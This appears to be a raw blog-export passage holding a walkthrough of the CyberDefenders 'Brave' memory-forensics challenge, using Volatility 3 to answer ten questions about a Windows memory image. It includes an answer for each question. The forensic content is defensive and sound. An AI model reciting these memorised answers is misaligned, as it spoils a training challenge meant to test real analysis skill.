the windows registries! One of the most important registries is `UserAssist`\nThe `UserAssist` key, a part of Microsoft Windows registry, records the information related to programs run by a user on a Windows system\n\nVolatility is powerful! we can use the `userassist` plugin to get what we want!\n\n``` bash command line prompt \nvol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.registry.userassist | grep -i brave \n* 0xa80333cda0000       \\??\\C:\\Users\\John Doe\\ntuser.dat        ntuser.dat\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count  2021-04-30 17:52:18      Value   %ProgramFiles%\\BraveSoftware\\Temp\\GUM20E0.tmp\\BraveUpdate.exe N/A      0       0       0:00:03  N/A\n* 0xa80333cda000        \\??\\C:\\Users\\John Doe\\ntuser.dat        ntuser.dat\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count  2021-04-30 17:52:18      Value   %ProgramFiles%\\BraveSoftware\\Update\\BraveUpdate.exe     N/A   0:00:24.797000   N/A\n* 0xa80333cda000        \\??\\C:\\Users\\John Doe\\ntuser.dat        ntuser.dat\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count  2021-04-30 17:52:18      Value   Brave   N/A     9       22      4:01:54  2021-04-30 17:48:45\n* 0xa80333cda000        \\??\\C:\\Users\\John Doe\\ntuser.dat        ntuser.dat\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}\\Count  2021-04-30 17:51:18      Value   C:\\Users\\Public\\Desktop\\Brave.lnk       N/A     8       0     0:00:00.508000   2021-04-30 17:48:45\n```\n:::success\nAnswer:  04:01:54\n:::\n\n\n","slug":"CyberDefenders/brave","published":1,"updated":"2023-03-23T17:35:09.768Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clfzirxne0009d5qfbbh65c00","content":"<p>This CTF challenge is about retrieving data from a memory dump, and analyzing the processes and connections and dealing with registries!</p>\n<h1 id=\"challenge-information\"><a class=\"markdownIt-Anchor\" href=\"#challenge-information\">#</a> Challenge Information</h1>\n<details class=\"info\"><summary>Description</summary><div>\n<p>A memory image was taken from a seized Windows machine. Analyze the image and answer the provided questions.</p>\n</div></details>\n<p>Challenge Link &amp; Author</p>\n<div class=\"links\"><div class=\"item\" title=\"Challenge Link\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjc=\" data-background-image=\"https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjc=\">Challenge Link</span>\n          <p class=\"desc\">CyberDefenders - Brave</p>\n          </div></div><div class=\"item\" title=\"Author - DFIRScience\" style=\"--block-color:#fcc11c;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9ERklSU2NpZW5jZQ==\" data-background-image=\"https://pbs.twimg.com/profile_images/1517319188167204866/lgRHWtGk_400x400.jpg\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9ERklSU2NpZW5jZQ==\">Author - DFIRScience</span>\n          <p class=\"desc\">DFIRScience Twitter Profile</p>\n          </div></div></div>\n<h1 id=\"walkthrough\"><a class=\"markdownIt-Anchor\" href=\"#walkthrough\">#</a> Walkthrough</h1>\n<p>Memory acquisition  involves copying the contents of volatile memory to non-volatile storage. This is arguably one of the most important and precarious steps in the memory forensics process<br>\nThe memory dump will contains many usefull information like the time of the memory acquisition, The KB version, The build number and version of the operating system</p>\n<blockquote>\n<p>1- What time was the RAM image acquired according to the suspect system? (YYYY-MM-DD HH:MM:SS)</p>\n</blockquote>\n<p>We can inspect these information using  <code>imageinfo</code>  plugin in volatility</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.info </span><br><span class=\"line\"></span><br><span class=\"line\">Kernel Base     0xf8043cc00000</span><br><span class=\"line\">DTB     0x1aa000</span><br><span class=\"line\">Symbols ........</span><br><span class=\"line\">Is64Bit True</span><br><span class=\"line\">IsPAE   False</span><br><span class=\"line\">layer_name      0 WindowsIntel32e</span><br><span class=\"line\">memory_layer    1 FileLayer</span><br><span class=\"line\">KdVersionBlock  0xf8043d80f368</span><br><span class=\"line\">Major/Minor     15.19041</span><br><span class=\"line\">MachineType     34404</span><br><span class=\"line\">KeNumberProcessors      4</span><br><span class=\"line\">SystemTime      2021-04-30 17:52:19</span><br><span class=\"line\">NtSystemRoot    C:\\Windows</span><br><span class=\"line\">NtProductType   NtProductWinNt</span><br><span class=\"line\">NtMajorVersion  10</span><br><span class=\"line\">NtMinorVersion  0</span><br><span class=\"line\">PE MajorOperatingSystemVersion  10</span><br><span class=\"line\">PE MinorOperatingSystemVersion  0</span><br><span class=\"line\">PE Machine      34404</span><br><span class=\"line\">PE TimeDateStamp        Tue Oct 11 07:04:26 1977</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer:  2021-04-30 17:52:19</p>\n</div>\n<blockquote>\n<p>2- What is the SHA256 hash value of the RAM image?</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">sha256sum</span> 20210430-Win10Home-20H2-64bit-memdump.mem</span><br><span class=\"line\">9db01b1e7b19a3b2113bfb65e860fffd7a1630bdf2b18613d206ebf2aa0ea172 20210430-Win10Home-20H2-64bit-memdump.mem</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer:  9db01b1e7b19a3b2113bfb65e860fffd7a1630bdf2b18613d206ebf2aa0ea172</p>\n</div>\n<blockquote>\n<p>3- What is the process ID of “brave.exe”?</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.pslist | grep -i brave</span><br><span class=\"line\">PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime              ExitTime       </span><br><span class=\"line\">4856    1872    brave.exe       0xbf0f6ca782c0  0       -       1               False    2021-04-30 17:48:45    2021-04-30 17:50:56</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer: 4856</p>\n</div>\n<blockquote>\n<p>4- How many established network connections were there at the time of acquisition? (number)</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.netscan  | grep -i <span class=\"string\">&quot;2021-04-30&quot;</span> | grep -i ESTABLISHED</span><br><span class=\"line\">0xbf0f6a53ca20  TCPv4   10.0.2.15       49833   52.230.222.68   443     ESTABLISHED     2812    svchost.exe     2021-04-30 17:50:07</span><br><span class=\"line\">0xbf0f6ad16050  TCPv4   10.0.2.15       49829   142.250.191.208 443     ESTABLISHED     5624    svchost.exe     2021-04-30 17:49:58</span><br><span class=\"line\">0xbf0f6ad1fad0  TCPv4   10.0.2.15       49847   52.230.222.68   443     ESTABLISHED     2812    svchost.exe     2021-04-30 17:52:17</span><br><span class=\"line\">0xbf0f6c6352b0  TCPv4   10.0.2.15       49842   52.113.196.254  443     ESTABLISHED     5104    SearchApp.exe   2021-04-30 17:51:25</span><br><span class=\"line\">0xbf0f6c7104d0  TCPv4   10.0.2.15       49778   185.70.41.130   443     ESTABLISHED     1840    chrome.exe      2021-04-30 17:45:00</span><br><span class=\"line\">0xbf0f6cd4fa20  TCPv4   10.0.2.15       49837   204.79.197.200  443     ESTABLISHED     5104    SearchApp.exe   2021-04-30 17:51:18</span><br><span class=\"line\">0xbf0f6d0c64a0  TCPv4   10.0.2.15       49843   204.79.197.222  443     ESTABLISHED     5104    SearchApp.exe   2021-04-30 17:51:26</span><br><span class=\"line\">0xbf0f6d51c4a0  TCPv4   10.0.2.15       49838   13.107.3.254    443     ESTABLISHED     5104    SearchApp.exe   2021-04-30 17:51:23</span><br><span class=\"line\">0xbf0f6d525a20  TCPv4   10.0.2.15       49845   23.101.202.202  443     ESTABLISHED     1156    MsMpEng.exe     2021-04-30 17:51:36</span><br><span class=\"line\">0xe80000193a20  TCPv4   10.0.2.15       49845   23.101.202.202  443     ESTABLISHED     1156    MsMpEng.exe     2021-04-30 17:51:36</span><br></pre></td></tr></table></figure>\n<p>Oh wait man! Don’t count it manually, just use the magic of  <code>wc -l</code>  !</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.netscan  | grep -i <span class=\"string\">&quot;2021-04-30&quot;</span> | grep -i ESTABLISHED | <span class=\"built_in\">wc</span> -l</span><br><span class=\"line\"></span><br><span class=\"line\">10</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer: 10</p>\n</div>\n<blockquote>\n<p>5- What FQDN does Chrome have an established network connection with?</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.netscan | grep -i chrome</span><br><span class=\"line\">0xbf0f6a896ae0.0TCPv4   10.0.2.15DB scan49773fin185.70.41.35    443     FIN_WAIT2       1840    chrome.exe      2021-04-30 17:44:58</span><br><span class=\"line\">0xbf0f6c7104d0  TCPv4   10.0.2.15       49778   185.70.41.130   443     ESTABLISHED     1840    chrome.exe      2021-04-30 17:45:00</span><br><span class=\"line\">0xbf0f6c85bb20  TCPv4   10.0.2.15       49775   185.70.41.35    443     FIN_WAIT2       1840    chrome.exe      2021-04-30 17:44:58</span><br><span class=\"line\">0xbf0f6ca71a20  TCPv4   10.0.2.15       49769   142.250.190.14  443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:44:55</span><br><span class=\"line\">0xbf0f6cbb9530  TCPv4   10.0.2.15       49772   185.70.41.35    443     FIN_WAIT2       1840    chrome.exe      2021-04-30 17:44:58</span><br><span class=\"line\">0xbf0f6cfd17f0  TCPv4   10.0.2.15       49777   35.186.220.63   443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:44:58</span><br><span class=\"line\">0xbf0f6d51c010  TCPv4   10.0.2.15       49763   172.217.4.35    443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:44:53</span><br><span class=\"line\">0xbf0f6d5c8a70  TCPv4   10.0.2.15       49797   172.217.4.74    443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:48:27</span><br><span class=\"line\">0xbf0f6d5d1ac0  TCPv4   10.0.2.15       49770   185.70.41.35    443     FIN_WAIT2       1840    chrome.exe      2021-04-30 17:44:57</span><br><span class=\"line\">0xbf0f6d8a1010  TCPv4   10.0.2.15       49771   185.70.41.35    443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:44:57</span><br></pre></td></tr></table></figure>\n<p>Wow man! we found a single established connection with IP  <code>185.70.41.130</code> <br>\nI used a random website that give me the FQDN from the IP address!</p>\n<p><img data-src=\"https://imgur.com/XJSnlsS.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:  <code>protonmail.ch</code></p>\n</div>\n<blockquote>\n<p>6- What is the MD5 hash value of process executable for PID 6988?</p>\n</blockquote>\n<p>Let’s dump the executable of the process with pid 6988, I used to do that with  <code>procdump</code>  plugin with volatility2, but this time i am trying to use volatility3 so with somesearch i found that  <code>windows.pslist</code>  plugin has  <code>--dump</code>  argument that can dump the excutable of the process. Let’s do it !</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.pslist --pid 6988 --dump </span><br><span class=\"line\">Volatility 3 Framework 2.2.0</span><br><span class=\"line\">Progress:  100.00               PDB scanning finished</span><br><span class=\"line\">PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime        File output</span><br><span class=\"line\"></span><br><span class=\"line\">6988    4352    OneDrive.exe    0xbf0f6d4262c0  26      -       1       True    2021-04-30 17:40:01     N/A     pid.6988.0x1c0000.dmp</span><br></pre></td></tr></table></figure>\n<p>Now it’s time to use  <code>md5sum</code>  to get the md5 hash of the executable!</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">md5sum</span> pid.6988.0x1c0000.dmp</span><br><span class=\"line\">0b493d8e26f03ccd2060e0be85f430af  pid.6988.0x1c0000.dmp</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer: 0b493d8e26f03ccd2060e0be85f430af</p>\n</div>\n<blockquote>\n<p>7- What is the word starting at offset 0x45BE876 with a length of 6 bytes?<br>\nOK we need to know the word at offset 0x45BE876! we can do it using  <code>xxd</code>  just we start from this offest and stop after 6 bytes! to specify the offset that you want to start from it just use  <code>-s</code>  options and to specify the length to display use  <code>-l</code>  option</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">xxd -g1 --s 0x45be876 -l 6 20210430-Win10Home-20H2-64bit-memdump.mem </span><br><span class=\"line\">045be876: 68 61 63 6b 65 72                                hacker</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer: hacker</p>\n</div>\n<blockquote>\n<p>8- What is the creation date and time of the parent process of “powershell.exe”? (YYYY-MM-DD HH:MM:SS)</p>\n</blockquote>\n<p>We need to know the parent process of powershell! we can do it using  <code>pslist</code>  and check the  <code>PPID</code> . But I’ll go with  <code>pstree</code>  plugin! it will make it easier for me. I don’t want to waste my time searching at the parent process using PPID !</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.pstree |  grep -i powershell -B 4</span><br><span class=\"line\">* 564   668     LogonUI.exe     0xbf0f6b7b7100  0       -       1       False   2021-04-30 12:39:44      2021-04-30 17:39:58</span><br><span class=\"line\">* 4296  668     userinit.exe    0xbf0f6ca8f080  0       -       1       False   2021-04-30 17:39:48      2021-04-30 17:40:12</span><br><span class=\"line\">** 4352 4296    explorer.exe    0xbf0f6ca662c0  82      -       1       False   2021-04-30 17:39:48      N/A</span><br><span class=\"line\">*** 6884        4352    VBoxTray.exe    0xbf0f6d186080  11      -       1       False   2021-04-30 17:40:01      N/A</span><br><span class=\"line\">*** 5096        4352    powershell.exe  0xbf0f6d97f2c0  12      -       1       False   2021-04-30 17:51:19      N/A</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer: 2021-04-30 17:39:48</p>\n</div>\n<blockquote>\n<p>9- What is the full path and name of the last file opened in notepad?</p>\n</blockquote>\n<p>Notepad is an executable that use the file as an argument ! so  <code>cmdline</code>  plugin will help us the get the files opened with notepad !</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.cmdline | grep -i notepad   </span><br><span class=\"line\">2520 notepad.exe     <span class=\"string\">&quot;C:\\Windows\\system32\\NOTEPAD.EXE&quot;</span> C:\\Users\\JOHNDO~1\\AppData\\Local\\Temp\\7zO4FB31F24\\accountNum</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer:  C:\\Users\\JOHNDO~1\\AppData\\Local\\Temp\\7zO4FB31F24\\accountNum</p>\n</div>\n<blockquote>\n<p>10- How long did the suspect use Brave browser? (hh:mm:ss)</p>\n</blockquote>\n<p>Let me tell you something! When we speak about more details about system apps nothing will be usefull more than the windows registries! One of the most important registries is  <code>UserAssist</code> <br>\nThe  <code>UserAssist</code>  key, a part of Microsoft Windows registry, records the information related to programs run by a user on a Windows system</p>\n<p>Volatility is powerful! we can use the  <code>userassist</code>  plugin to get what we want!</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.registry.userassist | grep -i brave </span><br><span class=\"line\">* 0xa80333cda0000       \\??\\C:\\Users\\John Doe\\ntuser.dat        ntuser.dat\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\&#123;CEBFF5CD-ACE2-4F4F-9178-9926F41749EA&#125;\\Count  2021-04-30 17:52:18      Value   %ProgramFiles%\\BraveSoftware\\Temp\\GUM20E0.tmp\\BraveUpdate.exe N/A      0       0       0:00:03  N/A</span><br><span class=\"line\">* 0xa80333cda000        \\??\\C:\\Users\\John Doe\\ntuser.dat        ntuser.dat\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\&#123;CEBFF5CD-ACE2-4F4F-9178-9926F41749EA&#125;\\Count  2021-04-30 17:52:18      Value   %ProgramFiles%\\BraveSoftware\\Update\\BraveUpdate.exe     N/A   0:00:24.797000   N/A</span><br><span class=\"line\">* 0xa80333cda000        \\??\\C:\\Users\\John Doe\\ntuser.dat        ntuser.dat\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\&#123;CEBFF5CD-ACE2-4F4F-9178-9926F41749EA&#125;\\Count  2021-04-30 17:52:18      Value   Brave   N/A     9       22      4:01:54  2021-04-30 17:48:45</span><br><span class=\"line\">* 0xa80333cda000        \\??\\C:\\Users\\John Doe\\ntuser.dat        ntuser.dat\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\&#123;F4E57C4B-2036-45F0-A9AB-443BCFE33D9F&#125;\\Count  2021-04-30 17:51:18      Value   C:\\Users\\Public\\Desktop\\Brave.lnk       N/A     8       0     0:00:00.508000   2021-04-30 17:48:45</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer:  04:01:54</p>\n</div>\n","site":{"data":{}},"length":8415,"excerpt":"","more":"<p>This CTF challenge is about retrieving data from a memory dump, and analyzing the processes and connections and dealing with registries!</p>\n<h1 id=\"challenge-information\"><a class=\"markdownIt-Anchor\" href=\"#challenge-information\">#</a> Challenge Information</h1>\n<details class=\"info\"><summary>Description</summary><div>\n<p>A memory image was taken from a seized Windows machine. Analyze the image and answer the provided questions.</p>\n</div></details>\n<p>Challenge Link &amp; Author</p>\n<div class=\"links\"><div class=\"item\" title=\"Challenge Link\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjc=\" data-background-image=\"https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjc=\">Challenge Link</span>\n          <p class=\"desc\">CyberDefenders - Brave</p>\n          </div></div><div class=\"item\" title=\"Author - DFIRScience\" style=\"--block-color:#fcc11c;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9ERklSU2NpZW5jZQ==\" data-background-image=\"https://pbs.twimg.com/profile_images/1517319188167204866/lgRHWtGk_400x400.jpg\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9ERklSU2NpZW5jZQ==\">Author - DFIRScience</span>\n          <p class=\"desc\">DFIRScience Twitter Profile</p>\n          </div></div></div>\n<h1 id=\"walkthrough\"><a class=\"markdownIt-Anchor\" href=\"#walkthrough\">#</a> Walkthrough</h1>\n<p>Memory acquisition  involves copying the contents of volatile memory to non-volatile storage. This is arguably one of the most important and precarious steps in the memory forensics process<br>\nThe memory dump will contains many usefull information like the time of the memory acquisition, The KB version, The build number and version of the operating system</p>\n<blockquote>\n<p>1- What time was the RAM image acquired according to the suspect system? (YYYY-MM-DD HH:MM:SS)</p>\n</blockquote>\n<p>We can inspect these information using  <code>imageinfo</code>  plugin in volatility</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.info </span><br><span class=\"line\"></span><br><span class=\"line\">Kernel Base     0xf8043cc00000</span><br><span class=\"line\">DTB     0x1aa000</span><br><span class=\"line\">Symbols ........</span><br><span class=\"line\">Is64Bit True</span><br><span class=\"line\">IsPAE   False</span><br><span class=\"line\">layer_name      0 WindowsIntel32e</span><br><span class=\"line\">memory_layer    1 FileLayer</span><br><span class=\"line\">KdVersionBlock  0xf8043d80f368</span><br><span class=\"line\">Major/Minor     15.19041</span><br><span class=\"line\">MachineType     34404</span><br><span class=\"line\">KeNumberProcessors      4</span><br><span class=\"line\">SystemTime      2021-04-30 17:52:19</span><br><span class=\"line\">NtSystemRoot    C:\\Windows</span><br><span class=\"line\">NtProductType   NtProductWinNt</span><br><span class=\"line\">NtMajorVersion  10</span><br><span class=\"line\">NtMinorVersion  0</span><br><span class=\"line\">PE MajorOperatingSystemVersion  10</span><br><span class=\"line\">PE MinorOperatingSystemVersion  0</span><br><span class=\"line\">PE Machine      34404</span><br><span class=\"line\">PE TimeDateStamp        Tue Oct 11 07:04:26 1977</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer:  2021-04-30 17:52:19</p>\n</div>\n<blockquote>\n<p>2- What is the SHA256 hash value of the RAM image?</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">sha256sum</span> 20210430-Win10Home-20H2-64bit-memdump.mem</span><br><span class=\"line\">9db01b1e7b19a3b2113bfb65e860fffd7a1630bdf2b18613d206ebf2aa0ea172 20210430-Win10Home-20H2-64bit-memdump.mem</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer:  9db01b1e7b19a3b2113bfb65e860fffd7a1630bdf2b18613d206ebf2aa0ea172</p>\n</div>\n<blockquote>\n<p>3- What is the process ID of “brave.exe”?</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.pslist | grep -i brave</span><br><span class=\"line\">PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime              ExitTime       </span><br><span class=\"line\">4856    1872    brave.exe       0xbf0f6ca782c0  0       -       1               False    2021-04-30 17:48:45    2021-04-30 17:50:56</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer: 4856</p>\n</div>\n<blockquote>\n<p>4- How many established network connections were there at the time of acquisition? (number)</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.netscan  | grep -i <span class=\"string\">&quot;2021-04-30&quot;</span> | grep -i ESTABLISHED</span><br><span class=\"line\">0xbf0f6a53ca20  TCPv4   10.0.2.15       49833   52.230.222.68   443     ESTABLISHED     2812    svchost.exe     2021-04-30 17:50:07</span><br><span class=\"line\">0xbf0f6ad16050  TCPv4   10.0.2.15       49829   142.250.191.208 443     ESTABLISHED     5624    svchost.exe     2021-04-30 17:49:58</span><br><span class=\"line\">0xbf0f6ad1fad0  TCPv4   10.0.2.15       49847   52.230.222.68   443     ESTABLISHED     2812    svchost.exe     2021-04-30 17:52:17</span><br><span class=\"line\">0xbf0f6c6352b0  TCPv4   10.0.2.15       49842   52.113.196.254  443     ESTABLISHED     5104    SearchApp.exe   2021-04-30 17:51:25</span><br><span class=\"line\">0xbf0f6c7104d0  TCPv4   10.0.2.15       49778   185.70.41.130   443     ESTABLISHED     1840    chrome.exe      2021-04-30 17:45:00</span><br><span class=\"line\">0xbf0f6cd4fa20  TCPv4   10.0.2.15       49837   204.79.197.200  443     ESTABLISHED     5104    SearchApp.exe   2021-04-30 17:51:18</span><br><span class=\"line\">0xbf0f6d0c64a0  TCPv4   10.0.2.15       49843   204.79.197.222  443     ESTABLISHED     5104    SearchApp.exe   2021-04-30 17:51:26</span><br><span class=\"line\">0xbf0f6d51c4a0  TCPv4   10.0.2.15       49838   13.107.3.254    443     ESTABLISHED     5104    SearchApp.exe   2021-04-30 17:51:23</span><br><span class=\"line\">0xbf0f6d525a20  TCPv4   10.0.2.15       49845   23.101.202.202  443     ESTABLISHED     1156    MsMpEng.exe     2021-04-30 17:51:36</span><br><span class=\"line\">0xe80000193a20  TCPv4   10.0.2.15       49845   23.101.202.202  443     ESTABLISHED     1156    MsMpEng.exe     2021-04-30 17:51:36</span><br></pre></td></tr></table></figure>\n<p>Oh wait man! Don’t count it manually, just use the magic of  <code>wc -l</code>  !</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 